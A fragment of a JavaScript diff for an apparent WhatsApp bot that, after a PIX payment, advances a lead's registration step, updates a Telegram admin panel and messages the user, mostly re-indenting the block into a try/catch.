-                if (session) {
-                    session.humanStep = 4;
-                    chatSessions.set(chatId, session);
-                    saveSessions();
+                    console.log(`💰 [PIX PAGO] Etapa 4 concluída automaticamente para: ${chatId} | TransID: ${transId}`);
 
-                    // Atualiza painel Telegram — Etapa 4 fica verde automaticamente
-                    if (session.tgMsgId) {
-                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 4);
-                        await notifyTelegram(t, session.tgMsgId, r);
-                    }
+                    if (session) {
+                        session.humanStep = 4;
+                        chatSessions.set(chatId, session);
+                        saveSessions();
 
-                    // Notifica admin sobre o pagamento
-                    await notifyTelegram(
-                        `✅ <b>PIX PAGO — ETAPA 4 CONCLUÍDA AUTOMATICAMENTE!</b>\n\nLead: <code>${chatId}</code>\nTransação: <code>${transId}</code>\n\n<i>O lead efetuou o pagamento do protocolo. Libere a Etapa 5 quando quiser.</i>`,
-                        undefined,
-                        { inline_keyboard: [[{ text: '✅ Liberar Etapa 5', callback_data: `etapa:5:${chatId}` }]] }
-                    );
+                        // Atualiza painel Telegram — Etapa 4 fica verde automaticamente
+                        if (session.tgMsgId) {
+                            const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 4);
+                            await notifyTelegram(t, session.tgMsgId, r);
+                        }
 
-                    if (session.assumeMsgId) {
-                        try {
-                            const msg = await client.getMessageById(session.assumeMsgId);
-                            await msg.edit(buildStatusMessage(4));
-                        } catch (e) {
+                        // Notifica admin sobre o pagamento
+                        await notifyTelegram(
+                            `✅ <b>PIX PAGO — ETAPA 4 CONCLUÍDA AUTOMATICAMENTE!</b>\n\nLead: <code>${chatId}</code>\nTransação: <code>${transId}</code>\n\n<i>O lead efetuou o pagamento do protocolo. Libere a Etapa 5 quando quiser.</i>`,
+                            undefined,
+                            { inline_keyboard: [[{ text: '✅ Liberar Etapa 5', callback_data: `etapa:5:${chatId}` }]] }
+                        );
+
+                        if (session.assumeMsgId) {
+                            try {
+                                const msg = await client.getMessageById(session.assumeMsgId);
+                                await msg.edit(buildStatusMessage(4));
+                            } catch (e) {
+                                await sendBotMessage(chatId, buildStatusMessage(4));
+                            }
+                        } else {
                             await sendBotMessage(chatId, buildStatusMessage(4));
                         }
-                    } else {
-                        await sendBotMessage(chatId, buildStatusMessage(4));
                     }
+                } catch (e) {
+                    console.error("❌ Erro ao processar cmd-pix-paid:", e.message);
                 }
-            } catch (e) {
-                console.error("❌ Erro ao processar cmd-pix-paid:", e.message);
             }
         }
-    }
-}, 3000);
+    }, 3000);
 
 console.log('⚡ [SISTEMA] Chamando client.initialize()...');
 client.initialize().then(() => {
